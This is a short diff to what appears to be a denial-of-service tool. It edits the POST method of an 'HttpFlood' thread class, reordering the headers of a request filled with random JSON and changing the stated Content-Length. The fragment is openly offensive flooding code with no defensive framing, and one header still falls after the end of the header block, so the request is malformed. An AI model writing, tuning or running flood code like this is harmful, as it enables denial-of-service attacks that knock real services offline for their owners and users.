@@ -770,9 +770,9 @@ class HttpFlood(Thread):
 
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
-            ("Content-Type: application/json\r\n"
+            ("Content-Length: 44\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
-             "Content-Length: 40\r\n\r\n"
+             "Content-Type: application/json\r\n\r\n"
              "Connection: Keep-Alive\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
         s = None
